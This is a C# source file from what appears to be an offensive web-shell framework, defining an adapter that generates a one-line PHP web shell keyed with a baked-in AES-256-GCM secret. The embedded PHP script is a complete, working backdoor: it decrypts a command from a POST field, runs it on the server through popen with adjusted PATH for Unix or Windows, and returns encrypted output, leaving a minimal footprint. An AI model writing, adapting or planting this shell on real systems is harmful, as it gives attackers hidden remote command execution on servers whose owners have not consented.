namespace Rod.Transport.WebShells;

/// <summary>
/// The Rod-native PHP web shell: a one-line placed script whose only
/// secret is a 256-bit key baked at generation, carrying the sealed
/// family's channel (AES-256-GCM both directions -- the wire half lives
/// in <see cref="RodSealedAdapter"/>). The command runs through the
/// standard, documented process functions -- a PATH setup for both OS
/// families and a read pipe -- the plain shape the one-liner family's
/// template uses, because that part is just how PHP runs a command. No
/// function-fallback chains and no bypass logic: those belong to
/// out-of-tree tradecraft (architecture.md Sec 13).
/// </summary>
public sealed class RodPhpAdapter : RodSealedAdapter
{
    public override string Id => "rod-php";
    public override string ScriptLanguage => "php";

    protected override (string Prefix, string Suffix) KeyLiteral => ("base64_decode('", "')");

    public override string RenderScript(string credential)
        => Script.Replace(KeyPlaceholder, credential);

    private const string KeyPlaceholder = "__ROD_KEY__";

    // The placed script: decode the key, take the first POST value, split
    // it into nonce/ciphertext/tag at the fixed offsets, run the decrypted
    // command through the standard popen read pipe, and answer with a
    // fresh nonce sealing the output. One line, no markers, no second
    // request shape -- the whole footprint is this line and the key in it.
    private const string Script = """
        <?php $k=base64_decode('__ROD_KEY__');if(!empty($_POST)){$v=base64_decode(reset($_POST));if($v!==false&&strlen($v)>=28){$c=openssl_decrypt(substr($v,28),'aes-256-gcm',$k,OPENSSL_RAW_DATA,substr($v,0,12),substr($v,-16));if($c!==false){$d=dirname($_SERVER['SCRIPT_FILENAME']);if(substr($d,0,1)==='/'){@putenv('PATH='.getenv('PATH').':/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');}else{@putenv('PATH='.getenv('PATH').';C:\Windows\system32;C:\Windows;C:\Windows\System32\WindowsPowerShell\v1.0\');}$p=@popen($c,'r');$o='';if($p){while(!@feof($p)){$o.=@fread($p,4096);}@pclose($p);}$n=random_bytes(12);$t='';$e=openssl_encrypt($o,'aes-256-gcm',$k,OPENSSL_RAW_DATA,$n,$t);echo base64_encode($n.$e.$t);die();}}}?>
        """;
}
